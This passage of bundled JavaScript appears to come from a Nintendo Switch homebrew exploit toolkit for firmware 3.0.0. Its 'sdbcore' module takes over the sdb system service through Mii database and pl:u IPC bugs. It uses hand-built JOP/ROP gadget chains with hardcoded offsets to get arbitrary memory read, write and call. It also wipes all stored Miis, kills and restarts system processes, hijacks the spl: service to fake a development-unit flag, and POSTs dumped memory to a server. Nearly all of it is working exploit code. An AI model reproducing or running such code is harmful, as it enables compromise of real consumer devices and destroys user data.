	var checker = [0,1,2,3,4,5,6,7,8,16,17,18,19,20,21,22,23,24,32,33,34,35,36,37,38,39,40,48,49,50,51,52,53,54,55,56,64,65,66,67,68,69,70,71,72,80,81,82,83,84,85,86,87,88,96,97,98,99,100,101,102,103,104,112,113,114,115,116,117,118,119,120,128,129,130,131,132,133,134,135,136];
	return checker.indexOf(code) >= 0;
}

var sdbcore = function(sc, vers) {
	if (!sdbcore.prototype.importedMixins) {
		Object.keys(svcMixin).forEach((k) => {
			sdbcore.prototype[k] = svcMixin[k];
		});

		Object.keys(sploitMixin).forEach((k) => {
			sdbcore.prototype[k] = sploitMixin[k];
		});

		sdbcore.prototype.importedMixins = true;
	}

	utils.log('Starting sdbcore...');
	this.sc = sc;
	window.sc = sc;
	this.initialized = false;
	this.vers = vers;
	this.offsets = this.get_offsets();
	if (this.offsets == null) {
		utils.log('Unknown version: '+vers);
		return;
	}
	this.svcs = this.offsets['svc_dic'];

	this.sploitMixinInit();

	utils.log('Pwning sdb...');
	this.initialize(this.sc);
	utils.log('Pwned sdb...');
};

sdbcore.prototype.name = "sdb";

sdbcore.prototype.queryMem = function(addr, raw) {
	if(arguments.length == 1)
		raw = false;

	var meminfo = utils.add2(this.sdb_base, 0x40000);
	var pageinfo = utils.add2(this.sdb_base, 0x40028);

	var memperms = ['NONE', 'R', 'W', 'RW', 'X', 'RX', 'WX', 'RWX'];
	var memstates = ['NONE', '(1)', '(2)', 'CODE-STATIC', 'CODE', 'HEAP', 'SHARED-MEM-BLOCK', 'MODULE-CODE-STATIC', 'MODULE-CODE', 'STACK-MIRROR', 'THREAD-LOCAL-STORAGE', 'MEMORY_MIRROR', '(15)', 'RESERVED'];
	this.svc(0x6, [meminfo, pageinfo, addr]);

	var ms = this.rw.read(utils.add2(meminfo, 0x10));
	ms =  utils.paddr(ms);
	/*if(!raw && ms[1] == 0 && ms[0] < memstates.length)
    ms = memstates[ms[0]];
    else if(!raw)
    ms = 'UNKNOWN'*/
	var mp = this.rw.read(utils.add2(meminfo, 0x18));
	if(!raw && mp[1] == 0 && mp[0] < memperms.length)
		mp = memperms[mp[0]];

	var data = [this.rw.read(meminfo), this.rw.read(utils.add2(meminfo, 8)), ms, mp, this.rw.read(pageinfo)];

	return data;
};


sdbcore.prototype.svc = function(id, registers, dump_regs) {
	if (arguments.length == 2)
		dump_regs = false;
	if (!(id in this.svcs)) {
		utils.log('Error: sdb does not contain svc 0x'+id.toString(16));
		return null;
	}
	return this.slowCall(this.svcs[id], registers, [], dump_regs);
};

sdbcore.prototype.resetModule = function() {
	// wipe all miis
	this.handle = sc.ipcMsg(0).data(0xA523B78F).sendTo('mii:e').assertOk().movedHandles[0];
	utils.log("mii handle is 0x" + this.handle.toString(16));
	utils.log("wipe miis ...");
	Wipe(this.handle);

	var resetcount = 0;
	var sdbPid = getServicePid(this.handle);
	var tid = utils.parseAddr('0100000000000039');

	utils.log("reloading sdb, this might take a while ...");

	while(1)
	{
		sc.svcCloseHandle(this.handle);
		sc.killAutoHandle();

		// restart sdb
		sc.ipcMsg(1).data(sdbPid).sendTo('pm:shell').assertOk();
		sdbPid = this.sc.ipcMsg(0).datau64(0, tid, 3).sendTo('pm:shell').data[0];
		utils.log("new sdb pid: 0x" + sdbPid.toString(16));

		this.handle = sc.ipcMsg(0).data(0xA523B78F).sendTo('mii:e').assertOk().movedHandles[0];

		this.sdb_base = GetLoadBase(this.handle, this.authorid);
	//	utils.log("this.sdb_base at " + utils.paddr(this.sdb_base));

		if(checkMiiCode(this.sdb_base[0] >>> 24) && checkMiiCode((this.sdb_base[0] >>> 16) & 0xFF) && this.sdb_base[1] > 0)
		{
			utils.log("sdb pid is 0x" + sdbPid.toString(16) + " this.sdb_base at " + utils.paddr(this.sdb_base));
			utils.log("** good base ***");
			break;
		}
		resetcount++;
	}
};

function add64(buf, offs, data)
{
	buf[offs++] = data[0] & 0xFF;
	buf[offs++] = (data[0] >>> 8) & 0xFF;
	buf[offs++] = (data[0] >>> 16) & 0xFF;
	buf[offs++] = (data[0] >>> 24) & 0xFF;
	buf[offs++] = data[1] & 0xFF;
	buf[offs++] = (data[1] >>> 8) & 0xFF;
	buf[offs++] = (data[1] >>> 16) & 0xFF;
	buf[offs++] = (data[1] >>> 24) & 0xFF;
}

sdbcore.prototype.setupBuffers = function() {
	this.scratch = utils.add2(this.sdb_base, 0x14ED00);
	
	this.pdm_base = utils.add2(this.sdb_base, 0x150ec0);
	utils.log("this.pdm_base at " + utils.paddr(this.pdm_base));

	var returnAddr = utils.add2(this.sdb_base, 0x2fc58);

	// rewrite pl:u cmd1
	var writeAddr = utils.add2(this.sdb_base, 0x99A98);
	var writeValue = utils.add2(this.sdb_base, 0x017d80); // gadget 0

	var buf = new Uint8Array(0x700);

	/// JOP chains
	// notice how nicely are these values compacted

	// miihax arb.write
	add64(buf, 0x0000, utils.add2(this.pdm_base, 0x0020)); // A
	add64(buf, 0x0008, writeAddr);
	add64(buf, 0x0010, utils.add2(this.sdb_base, 0x2d170)); // *B
	add64(buf, 0x0018, utils.add2(this.sdb_base, 0x6740));
	add64(buf, 0x0020, utils.add2(this.pdm_base, 0x0010)); // *A; B
	add64(buf, 0x0028, utils.add2(this.sdb_base, 0x7160)); // *D
	add64(buf, 0x0030, utils.add2(this.sdb_base, 0x53430)); // *A + 0x10
	add64(buf, 0x0038, utils.add2(this.pdm_base, 0x0040)); // *A + 0x18; C
	add64(buf, 0x0040, utils.add2(this.pdm_base, 0x0028)); // *C; D
	add64(buf, 0x0048, utils.add2(this.pdm_base, 0x0060)); // *E; F
	add64(buf, 0x0050, utils.add2(this.sdb_base, 0x2f090)); // *D + 0x28
	add64(buf, 0x0058, utils.add2(this.pdm_base, 0x0048)); // *C + 0x18; E
	add64(buf, 0x0060, utils.add2(this.pdm_base, 0x0060)); // *F; G
	add64(buf, 0x0068, utils.add2(this.sdb_base, 0x7160)); // *G + 0x08
	add64(buf, 0x0070, utils.add2(this.sdb_base, 0x7160)); // *B + 0x60
	add64(buf, 0x0078, utils.add2(this.pdm_base, 0x0080)); // *F + 0x18; H
	add64(buf, 0x0080, utils.add2(this.pdm_base, 0x0098)); // *H; I
	add64(buf, 0x0088, utils.add2(this.sdb_base, 0x2d5f8)); // *F + 0x28
	add64(buf, 0x0090, utils.add2(this.sdb_base, 0x47cc8)); // *F + 0x30
	add64(buf, 0x0098, utils.add2(this.sdb_base, 0x7218)); // *G + 0x38
	add64(buf, 0x00a0, returnAddr); // *I + 0x08
	add64(buf, 0x00a8, writeValue); // *I + 0x10 
	// note: b0 - b8 used
	add64(buf, 0x00c0, utils.add2(this.sdb_base, 0x2d5f8)); // *I + 0x28
	add64(buf, 0x00c8, utils.add2(this.sdb_base, 0x4b46c)); // *I + 0x30
	// pluhax arb.read and arb.write; both share 'first stage'
	add64(buf, 0x00b0, utils.add2(this.pdm_base, 0x0c0)); // A
	add64(buf, 0x00b8, utils.add2(this.pdm_base, 0x0d8)); // B
	// note: c0 - c8 used
	add64(buf, 0x00d0, utils.add2(this.sdb_base, 0x0026cc)); // *A + 16; gatget 4
	add64(buf, 0x00d8, utils.add2(this.pdm_base, 0x110)); // *B; C
	add64(buf, 0x00e0, utils.add2(this.pdm_base, 0x148)); // *E; F
	add64(buf, 0x00e8, utils.add2(this.pdm_base, 0x120)); // *E + 8; G
	add64(buf, 0x00f0, utils.add2(this.sdb_base, 0x0033d0)); // *A + 48; gatget 3
	add64(buf, 0x00f8, utils.add2(this.sdb_base, 0x01349c)); // *B + 32; gatget 10
	add64(buf, 0x0100, utils.add2(this.pdm_base, 0x0e0)); // *D + 8; E
	add64(buf, 0x0108, utils.add2(this.sdb_base, 0x025d08)); // *B + 48; gatget 6
	add64(buf, 0x0110, utils.add2(this.sdb_base, 0x04de9c)); // *C; gatget 5
	add64(buf, 0x0118, utils.add2(this.sdb_base, 0x014134)); // *C + 8; gatget 7
	add64(buf, 0x0120, utils.add2(this.pdm_base, 0x158)); // *G; H
	add64(buf, 0x0128, utils.add2(this.sdb_base, 0x02d6c8)); // *C + 24; gatget 8
	add64(buf, 0x0130, utils.add2(this.pdm_base, 0x168)); // Z
	add64(buf, 0x0138, utils.add2(this.pdm_base, 0x0f8)); // *B + 96; D
	add64(buf, 0x0140, utils.add2(this.sdb_base, 0x00638c)); // *B + 104; gatget 11
	add64(buf, 0x0148, utils.add2(this.sdb_base, 0x04dbf8)); // *F; gatget 12
	add64(buf, 0x0150, utils.add2(this.sdb_base, 0x02de0c)); // *F + 8; gatget14w
	add64(buf, 0x0158, utils.add2(this.sdb_base, 0x020C84)); // *G; returnW; *V + 40; returnR
	add64(buf, 0x0160, utils.add2(this.sdb_base, 0x002850)); // *G + 8; gatget16w
	add64(buf, 0x0168, utils.add2(this.pdm_base, 0x170)); // *Z; Y
	add64(buf, 0x0170, utils.add2(this.pdm_base, 0x1a8)); // *X; W
	add64(buf, 0x0178, utils.add2(this.pdm_base, 0x180)); // *X + 8; U
	add64(buf, 0x0180, utils.add2(this.pdm_base, 0x1b8)); // *U; T
	add64(buf, 0x0188, utils.add2(this.sdb_base, 0x0071e0)); // *F + 64; gatget15w
	add64(buf, 0x0190, utils.add2(this.pdm_base, 0x130)); // *X + 32; V
	add64(buf, 0x0198, utils.add2(this.sdb_base, 0x04dbf8)); // *Y + 40; gatget 15r
	add64(buf, 0x01a0, utils.add2(this.sdb_base, 0x002850)); // *X + 48; gatget 16r
	add64(buf, 0x01a8, utils.add2(this.sdb_base, 0x02dd5c)); // *W; gatget 14r
	add64(buf, 0x01b0, utils.add2(this.pdm_base, 0x170)); // *Z + 72; X
	add64(buf, 0x01b8, utils.add2(this.sdb_base, 0x035180)); // *T; gatget 17r
	// pluhax leak SP
	add64(buf, 0x01c0, utils.add2(this.pdm_base, 0x1c8)); // *C; D
	add64(buf, 0x01c8, utils.add2(this.sdb_base, 0x035180)); // *D; gatget 10
	add64(buf, 0x01d0, utils.add2(this.sdb_base, 0x002850)); // *D + 8; gatget 9
	add64(buf, 0x01d8, utils.add2(this.sdb_base, 0x011b38)); // gatget 7
	add64(buf, 0x01e0, utils.add2(this.pdm_base, 0x0c0)); // shared with arb.*
	add64(buf, 0x01e8, utils.add2(this.pdm_base, 0x1f0)); // A
	add64(buf, 0x01f0, utils.add2(this.pdm_base, 0x228)); // *A; gatget 5 ptr
	add64(buf, 0x01f8, utils.add2(this.pdm_base, 0x1f8)); // *A + 8; B
	add64(buf, 0x0200, utils.add2(this.pdm_base, 0x1c0)); // *B + 8; C
	add64(buf, 0x0208, utils.add2(this.pdm_base, 0x218)); // *C + 72; E
	add64(buf, 0x0210, utils.add2(this.pdm_base, 0x130)); // *A + 32; return ptr; shared with arb.*
	add64(buf, 0x0218, utils.add2(this.pdm_base, 0x1d8)); // *E; gatget 7 ptr
	add64(buf, 0x0220, utils.add2(this.sdb_base, 0x02d8d4)); // *A + 48; gatget 6
	add64(buf, 0x0228, utils.add2(this.sdb_base, 0x04de98)); // gatget 5
	// almost filled
	add64(buf, 0x0290, utils.add2(this.sdb_base, 0x04a3a8)); // *D + 200; gatget 8

	//add64(buf, 0x02e0, 0); // *C + 288; leaked SP

	// pluhax arb.call
	add64(buf, 0x0230, utils.add2(this.pdm_base, 0x0c0)); // shared with arb.*
	add64(buf, 0x0238, utils.add2(this.pdm_base, 0x240)); // A
	add64(buf, 0x0240, utils.add2(this.pdm_base, 0x268)); // *A; gatget 5 ptr
	add64(buf, 0x0248, utils.add2(this.pdm_base, 0x258)); // *A + 8; B
	add64(buf, 0x0250, utils.add2(this.pdm_base, 0x260)); // *B - 8; C
	add64(buf, 0x0258, utils.add2(this.pdm_base, 0x260)); // pdmNext1 + 8; gatget 11 ptr ptr
	add64(buf, 0x0260, utils.add2(this.pdm_base, 0x1b8)); // gatget 11 ptr; shared with arb.*
	add64(buf, 0x0268, utils.add2(this.sdb_base, 0x014104)); // gatget 5
	add64(buf, 0x0270, utils.add2(this.pdm_base, 0x130)); // pdmNext1 + 32; return ptr; shared with arb.*
	add64(buf, 0x0278, utils.add2(this.sdb_base, 0x01349c)); // *C + 24; gatget 6
	add64(buf, 0x0280, utils.add2(this.sdb_base, 0x02850)); // pdmNext1 + 48; gatget 10

	//add64(buf, 0x02a0, utils.add2(this.sdb_base, 0x2fc68)); // *A + 96; callAddr
	add64(buf, 0x02a8, utils.add2(this.sdb_base, 0x002c0)); // *A + 104; gatget 7

	add64(buf, 0x02d0, utils.add2(this.sdb_base, 0x4de98)); // pdmNext0; gatget 9

	//add64(buf, 0x02e8, 0); // storeAddr; returned X0
	//add64(buf, 0x02f0, 0); // storeAddr+8; returned X1


	add64(buf, 0x0300, [0x11223344, 0]); // testing value to read out

	utils.log("writePdm ...");
	writePdm(buf); // seems like it works reliably only once

	key = c64to8([this.pdm_base, [0xde000080, 0]]);

	var payload = new Uint8Array(48);
	add64(payload, 24, this.sdb_base); // 32bit LSB is kinda limited, so is 32bit MSB

	AddOrReplace(this.handle, key, payload, this.authorid);

	utils.log("trigger ...");
	Move(this.handle, key, 100);

	utils.log("cleanup ...");
	sc.svcCloseHandle(this.handle);
	sc.killAutoHandle();

	// prepare
	utils.log("entering pluhax ...");

	// arb.read and arb.write
	this.ipcGat1 = utils.add2(this.sdb_base, 0x00f194);
	this.ipcGat2 = utils.add2(this.sdb_base, 0x03f8a8);
	this.ipcGat9 = utils.add2(this.sdb_base, 0x0304c0);
	this.ipcGat13r = utils.add2(this.sdb_base, 0x02d8d4);
	this.ipcGat13w = utils.add2(this.sdb_base, 0x029b50);
	this.pdmEntry = utils.add2(this.pdm_base, 0x00b0); // JOP chain; shared for arb.read and arb.write
	this.pdmNext = utils.add2(this.pdm_base, 0x0128); // second stage JOP chain for arb.read; offset 8 (=0x130)

	// sp leak
	this.pdmLeakE = utils.add2(this.pdm_base, 0x1e0);

	// arb.call
	this.pdmCallE = utils.add2(this.pdm_base, 0x230);

	// shared for all calls (or ignored in some)
	this.ipcData = new Uint32Array(24);
	this.ipcData[15] = this.ipcGat1[0];
	this.ipcData[16] = this.ipcGat1[1];
	this.ipcData[17] = this.ipcGat9[0];
	this.ipcData[18] = this.ipcGat9[1];
	this.ipcData[19] = this.ipcGat2[0];
	this.ipcData[20] = this.ipcGat2[1];

	// run
	utils.log("trigger ..."); // return address: 0x020C84

	// get SP
	this.sdbPluSP = this.getSP();
	utils.log("pluSP at " + utils.paddr(this.sdbPluSP));

	// arb.call - prepare stack (permanent; maybe check after some calls?)
	this.write8(utils.add2(this.pdm_base, 0x2e8), utils.add2(this.sdbPluSP, 200)); // storeAddr (pdmNext0+24)
	this.write8(utils.add2(this.sdb_base, 0x579a8), utils.add2(this.sdbPluSP, 216)); // ROP chain 0
	this.write8(utils.add2(this.sdb_base, 0x01d44), utils.add2(this.sdbPluSP, 248)); // ROP chain 1
	this.write8(utils.add2(this.sdb_base, 0x4e950), utils.add2(this.sdbPluSP, 296)); // ROP chain 2
	this.write8(utils.add2(this.sdb_base, 0x1a0b8), utils.add2(this.sdbPluSP, 488)); // ROP chain 3
	this.write8(utils.add2(this.sdb_base, 0x3ca1c), utils.add2(this.sdbPluSP, 776)); // gatget 8
	this.write8(utils.add2(this.pdm_base, 0x2d0), utils.add2(this.sdbPluSP, 456)); // pdmNext0
	this.write8(utils.add2(this.pdm_base, 0x250), utils.add2(this.sdbPluSP, 760)); // pdmNext1
};

sdbcore.prototype.getSP = function() {
	// there is an offset between returned value and actualy saved one
	// i do not know if it is possible to get random addres that will make this fail
	// if so, just use read4 on this.pdm_base + 0x2e0 and from result subtract 0x3A8 instead

	this.ipcData[5] = this.pdmLeakE[0];
	this.ipcData[6] = this.pdmLeakE[1];

	var sp = [0,0]
	var ipc = sc.ipcMsg(1);
	ipc.datau32.apply(ipc, this.ipcData);
	sp[0] = ipc.sendTo('pl:u').cmdId;
	sp[1] = this.read4(utils.add2(this.pdm_base, 0x2e0 + 4)); // 32bit MSB

	return utils.sub2(sp, 0x328);
}


sdbcore.prototype.initialize = function(sc) {
	if (this.initialized) {
		utils.log('Already initialized...returning.');
		return;
	}

	this.authorid = getMiiAuthorId();
	utils.log("Author ID: " + Array.apply([], this.authorid).join(","));

	this.resetModule();
	this.setupBuffers();

	// write / read test
	var testAddr = utils.add2(this.pdm_base, 0x300);

	// write value
	utils.log("... write");
	this.write8([0x29910BAF, 0x11223344], testAddr);
	// read back
	utils.log("... read");
	var retVal = this.read8(testAddr);
	utils.log("read value: " + utils.paddr(retVal));

	utils.log('... call');
	utils.log('call: ' + utils.paddr(this.slowCall(0x02868, [[0xF00D1234, 0x1122aabb]])));

	if (this.vers == '3.0.0') {
		utils.log('Setting up RO hax...');
		this.setup_ro_hax();
	}

	this.initialized = true;
};

sdbcore.prototype.get_offsets = function() {
	var offset_dic = {
		'3.0.0' : {
			'memcpy' : 0x3a5f8, 
			'svc_dic' : {
				0x2 : 0x2fbf8,
				0x3 : 0x2fc00,
				0x4 : 0x2fc08,
				0x5 : 0x2fc10,
				0x6 : 0x2fc18,
				0x7 : 0x2fc30,
				0x8 : 0x2fc3c,
				0x9 : 0x2fc50,
				0xA : 0x2fc58,
				0xB : 0x2fc60,
				0xC : 0x2fc68,
				0x10 : 0x2fc80,
				0x12 : 0x2fc88,
				0x13 : 0x2fc90,
				0x14 : 0x2fc98,
				0x16 : 0x2fca0,
				0x18 : 0x2fca8,
				0x19 : 0x2fcc0,
				0x1A : 0x2fcc8,
				0x1B : 0x2fcd0,
				0x1C : 0x2fcd8,
				0x1D : 0x2fce0, 
				0x1F : 0x2fce8,
				0x21 : 0x2fd00,
				0x22 : 0x2fd08,
				0x25 : 0x2fd10,
				0x26 : 0x2fd28,
				0x27 : 0x2fd30,
				0x28 : 0x2fd38,
				0x29 : 0x2fd40,
				0x2c : 0x2fd58, 
				0x2d : 0x2fd60, 
				0x40 : 0x2fd80,
				0x41 : 0x2fda0,
				0x43 : 0x2fdb8,
				0x44 : 0x2fdd0,
				0x50 : 0x2fd68
			}
		}
	};
	if (this.vers in offset_dic) {
		return offset_dic[this.vers];
	}
	return null;
};

sdbcore.prototype.memdump = function(start, totalSize, name) {
	var end = utils.add2(start, totalSize);
	if (arguments.length == 2) {
		name = 'memdumps_sdb/sdb - '+utils.paddr(start) + ' - ' + utils.paddr(end) + '.bin';
	}

	var buf = new Uint32Array(8 * 1024 * 1024 / 4);
	var addr = sc.read8(sc.getAddr(buf), 4);

	utils.log('Dumping memory to '+name+'!');
	for(var idx = 0; idx < totalSize; idx += 0x700000) {
		size = totalSize - idx;
		size = size > 0x700000 ? 0x700000 : size;
		this.sc.gc();
		var obj = new sdbown(buf);
		var base = this.leakPrev(8);
		var sdbbuf = utils.add2(base, 0x100000);

		this.slowCall(this.offsets['memcpy'], [sdbbuf, start, size]);
		obj.svc.leak();

		this.sc.memview(utils.add2(addr, 0x100000), size, function(ab) {
			var view = new Uint8Array(ab);
			var xhr = new XMLHttpRequest();
			xhr.open('POST', '/filedump', false);
			xhr.setRequestHeader('Content-Type', 'application/octet-stream');
			xhr.setRequestHeader('Content-Disposition', name);
			xhr.send(view);
		});
	}
	this.sc.gc();
	utils.log('Dumped memory succesfully!');
};

sdbcore.prototype.slowCall = function(funcptr, args, fargs, dump_regs) {
	if(typeof(funcptr) == 'number') {
		funcptr = utils.add2(this.sdb_base, funcptr);
	}
	switch(arguments.length) {
	case 1:
		args = [];
	case 2:
		fargs = [];
	case 3:
		dump_regs = false;
	}

	for (var i = 0; i < args.length; i++) {
		if (typeof(args[i]) == 'number') {
			args[i] = [args[i], 0];
		}
	}

	var scratchOff = 0;

	// Write registers for native code.
	if(args.length > 0) {
		for(var i = 0; i < 8 && i < args.length; i++) {
			if(ArrayBuffer.isView(args[i]) || args[i] instanceof ArrayBuffer) {
				var size = args[i].byteLength;
				var saddr = utils.add2(this.scratch, scratchOff);
				this.memcpyFromBrowser(saddr, sc.getArrayBufferAddr(args[i]), size);
				this.write8(saddr, utils.add2(this.sdbPluSP, 128 + 8 * i));
				scratchOff += size;
				if(scratchOff & 0x7)
					scratchOff = (scratchOff & 0xFFFFFFF8) + 8;
			} else
				this.write8(args[i], utils.add2(this.sdbPluSP, 128 + 8 * i));
		}
	}

	this.write8(funcptr, utils.add2(this.pdm_base, 0x2a0));

	this.ipcData[5] = this.pdmCallE[0];
	this.ipcData[6] = this.pdmCallE[1];

	var ipc = sc.ipcMsg(1);
	ipc.datau32.apply(ipc, this.ipcData);
	var lo = ipc.sendTo('pl:u').cmdId;

	scratchOff = 0;
	if(args.length > 0) {
		for(var i = 0; i < 30 && i < args.length; i++) {
			if(ArrayBuffer.isView(args[i]) || args[i] instanceof ArrayBuffer) {
				var size = args[i].byteLength;
				var saddr = utils.add2(this.scratch, scratchOff);
				this.memcpyToBrowser(args[i], saddr, size);
				scratchOff += size;
				if(scratchOff & 0x7)
					scratchOff = (scratchOff & 0xFFFFFFF8) + 8;
			}
		}
	}
	return [lo, this.read4(utils.add2(this.pdm_base, 0x2e8 + 4))];
};

sdbcore.prototype.read8 = function(addr) {
	return [this.read4(addr), this.read4(utils.add2(addr, 4))];
};

sdbcore.prototype.read4 = function(addr) {
	var id2 = new Uint32Array(24);
	id2[3] = this.pdmNext[0];
	id2[4] = this.pdmNext[1];
	id2[5] = this.pdmEntry[0];
	id2[6] = this.pdmEntry[1];
	id2[9] = addr[0];
	id2[10] = addr[1];
	id2[13] = this.ipcGat13r[0];
	id2[14] = this.ipcGat13r[1];
	id2[15] = this.ipcGat1[0];
	id2[16] = this.ipcGat1[1];
	id2[17] = this.ipcGat9[0];
	id2[18] = this.ipcGat9[1];
	id2[19] = this.ipcGat2[0];
	id2[20] = this.ipcGat2[1];

	var ipc = sc.ipcMsg(1);
	ipc.datau32.apply(ipc, id2);
	return ipc.sendTo('pl:u').cmdId;
};

sdbcore.prototype.read2 = function(addr) {
	throw 'sdbcore.read2 not implemented';
};

sdbcore.prototype.read1 = function(addr) {
	throw 'sdbcore.read1 not implemented';
};

sdbcore.prototype.write8 = function(val, addr) {
	var id = new Uint32Array(24);
	id[3] = addr[0];
	id[4] = addr[1];
	id[5] = this.pdmEntry[0];
	id[6] = this.pdmEntry[1];
	id[9] = val[0];
	id[10] = val[1];
	id[13] = this.ipcGat13w[0];
	id[14] = this.ipcGat13w[1];
	id[15] = this.ipcGat1[0];
	id[16] = this.ipcGat1[1];
	id[17] = this.ipcGat9[0];
	id[18] = this.ipcGat9[1];
	id[19] = this.ipcGat2[0];
	id[20] = this.ipcGat2[1];

	var ipc = sc.ipcMsg(1);
	ipc.datau32.apply(ipc, id);
	ipc.sendTo('pl:u');
};

sdbcore.prototype.write82 = function(val, addr) {
	var id = new Uint32Array(24);
	id[3] = addr[0];
	id[4] = addr[1];
	id[5] = this.pdmEntry[0];
	id[6] = this.pdmEntry[1];
	id[9] = val[0];
	id[10] = val[1];
	id[13] = this.ipcGat13w[0];
	id[14] = this.ipcGat13w[1];
	id[15] = this.ipcGat1[0];
	id[16] = this.ipcGat1[1];
	id[17] = this.ipcGat9[0];
	id[18] = this.ipcGat9[1];
	id[19] = this.ipcGat2[0];
	id[20] = this.ipcGat2[1];

	var ipc = sc.ipcMsg(1);
	ipc.datau32.apply(ipc, id);
	ipc.sendTo('pl:u');
};

sdbcore.prototype.write4 = function(val, addr) {
	throw 'sdbcore.write4 not implemented';
};

sdbcore.prototype.write2 = function(val, addr) {
	throw 'sdbcore.write2 not implemented';
};

sdbcore.prototype.write1 = function(val, addr) {
	throw 'sdbcore.write1 not implemented';
};

sdbcore.prototype.memcpyFromBrowser = function(dst, src, size) {
	for(var i = 0; i < size; i += 8) {
		var s = utils.add2(src, i);
		//utils.log('[Bro] Reading ' + i);
		var v = [src[i >>> 2], src[(i >>> 2) + 1]];
		//utils.log('[SDB] Writing ' + utils.paddr(v) + ' to ' + i);
		this.write82(v, utils.add2(dst, i));
	}
};

sdbcore.prototype.memcpyToBrowser = function(dst, src, size) {
	var sub = [];
	for(var i = 0; i < size; i += 4) {
		//utils.log('[SDB] Reading ' + i);
		var v = this.read4(utils.add2(src, i));
		//utils.log('[Bro] Writing ' + v.toString(16) + ' to ' + i);
		dst[i >> 2] = v;
	}
};

sdbcore.prototype.malloc = function(size) {
	//return this.slowCall(this.offsets['malloc'], [0, size]);
};

sdbcore.prototype.free = function(addr) {
	//this.slowCall(this.offsets['free'], [0, addr]);
};

sdbcore.prototype.setup_ro_hax = function() {
	var sdbIpcBuf = utils.add2(this.sdb_base, 0x150000);
	
	var sdb = this;
	var sc = this.sc;

	function waitHandles(handles) {
		for(var i = 0; i < handles.length; ++i)
			sdb.write8([handles[i], 0], utils.add2(sdbIpcBuf, 4 + i * 4));
		var ret = sdb.svc(0x18, [sdbIpcBuf, utils.add2(sdbIpcBuf, 4), handles.length, 0])[0];
		var hndI = sdb.read4(sdbIpcBuf);
		return [ret, hndI];
	}

	function acceptSession(handle) {
		sdb.svc(0x41, [sdbIpcBuf, handle]);
		return sdb.read4(sdbIpcBuf);
	}

	function readIncoming(handle) {
		utils.log('Writing handle');
		sdb.write8([handle, 0], sdb.scratch);
		utils.log('replyandreceive');
		var ret = sdb.svc(0x44, [sdb.scratch, sdbIpcBuf, 0x1000, sdb.scratch, 1, [0, 0], [0xffffffff, 0xffffffff]])[0];
		utils.log('Copying data');
		if(ret == 0xf601)
			return null;
		var data = new Uint32Array(0x100);
		sdb.memcpyToBrowser(data, sdbIpcBuf, 7 << 2);
		utils.log('Done?');
		return data;
	}

	function respond(handle, data) {
		utils.log('Attempting to respond');
		sdb.memcpyFromBrowser(sdbIpcBuf, data, data.length << 2);
		utils.log('replyandreceive');
		utils.log(utils.paddr(sdb.svc(0x44, [sdb.scratch, sdbIpcBuf, 0x1000, sdb.scratch, 0, handle, [0, 0]])));
		utils.log('Done?');
	}

	this.sc.unregisterService('spl:');

	utils.log('Opening SM handle');
	utils.log(utils.paddr(sdb.svc(0x1F, [sdbIpcBuf, utils.add2(sdb.sdb_base, 0x71807)])));
	var sdbSmHandle = sdb.read4(sdbIpcBuf);
	utils.log('SM handle: ' + sdbSmHandle.toString(16));

	var data = new Uint32Array([0x4, 0xc, 0, 0, 0x49434653, 0, 2, 0, 0x3a6c7073, 0, 200, 0x20]);
	sdb.memcpyFromBrowser(sdbIpcBuf, data, data.length << 2);
	utils.log(utils.paddr(sdb.svc(0x22, [sdbIpcBuf, 0x1000, sdbSmHandle])));
	var output = new Uint32Array(0x100 >> 2);
	sdb.memcpyToBrowser(output, sdbIpcBuf, 4 << 2);
	
	for(var i = 0; i < 4; ++i)
		utils.log(output[i].toString(16));

	var portHandle = output[3];
	utils.log('Port handle: ' + portHandle.toString(16));
	var handles = [portHandle];
	
	waitHandles(handles);

	var lgetServicePid = function(service) {
		this.sc.killAutoHandle();
		var res = this.sc.ipcMsg(2).setType(3).datau64(0).sendTo(service).show();
		this.sc.svcCloseHandle(res.movedHandles[0]);
		return res.pid[0];
	};

	var service = 'ldr:ro';
	var pid = lgetServicePid(service);
	utils.log(service + ' is PID 0x'+pid.toString(16));

	this.sc.ipcMsg(1).data(pid).sendTo('pm:shell').show();

	var tid = utils.parseAddr('0100000000000037');

	var newPid = this.sc.ipcMsg(0).datau64(0, tid, 3).sendTo('pm:shell').show().data[1][0];

	var interval = setInterval(function() {
		var temp = waitHandles(handles);
		switch(temp[0]) {
		case 0:
			utils.log('Handle ' + temp[1] + ' ready');
			var handle = handles[temp[1]];
			if(handle == portHandle) {
				var pipe = acceptSession(portHandle);
				utils.log('Accepted new pipe ' + pipe.toString(16));
				handles.push(pipe);
			} else {
				utils.log('Got incoming message on ' + handle.toString(16));
				var data = readIncoming(handle);
				if(data == null) {
					utils.log('Pipe closed.  Removing.');
					sdb.svc(0x16, [handle]);
					handles.splice(handles.indexOf(handle), 1);
					clearInterval(interval); // We should be done now!
					if (sdb.onready != null)
						sdb.onready();
					break;
				}

				if(data[6] == 11) { // GetDevUnitFlag
					respond(handle, new Uint32Array([0, 0xa, 0, 0, 0x4f434653, 0, 0, 0, 0, 0]));
				} else if(data[6] == 0) {
					respond(handle, new Uint32Array([0, 0xa, 0, 0, 0x4f434653, 0, 0, 0, 1, 0]));
				} else {
					clearInterval(interval);
				}
			}
			break;
		case 0xea01:
			break;
		default:
			utils.log('Unknown ret for wait: ' + temp[0].toString(16));
			break;
		}
	}, 100);
};

module.exports = sdbcore;

},{"./sploitMixin":17,"./svc":19,"./utils":20}],17:[function(require,module,exports){
var utils = require('./utils');

var sploitMixin = {};

sploitMixin.sploitMixinInit = function () {
	this.ipcHandles = {};
};

sploitMixin.withHandle = function (handle, cb) {
	try {
		return cb(handle);
	} finally {
		this.svcCloseHandle(handle);
	}
};

sploitMixin.findUnmappedRegion = function (targetSize) {
	targetSize = utils.pad64(targetSize);

	// skip the first block so nobody tries to map at 0
	var addr = [0, 0];
	var [base, size, state, perm] = this.svcQueryMem(addr, true).assertOk();
	do {
		addr = utils.add2(addr, size);
		[base, size, state, perm] = this.svcQueryMem(addr, true).assertOk();
		if (base[0] !== addr[0] || base[1] !== addr[1]) {
			throw new Error('queryMem base mismatch?');
		}
	} while (size[1] < targetSize[1] || (size[1] === targetSize[1] && size[0] < targetSize[0]) || perm !== 0 || state !== 0);
	return addr;
};

module.exports = sploitMixin;

},{"./utils":20}],18:[function(require,module,exports){
/* eslint camelcase: "off" */
/* eslint no-redeclare: "off" */
/* eslint no-unmodified-loop-condition: "off" */
/* eslint no-fallthrough: "off" */
/* global XMLHttpRequest */
var utils = require('./utils');

var SDBCore = require('./sdbcore');
var NVCore = require('./nvcore');
var AsyncCaller = require('./AsyncCaller');
var svcMixin = require('./svc');
var sploitMixin = require('./sploitMixin');

var AltCaller = require('./AltCaller');
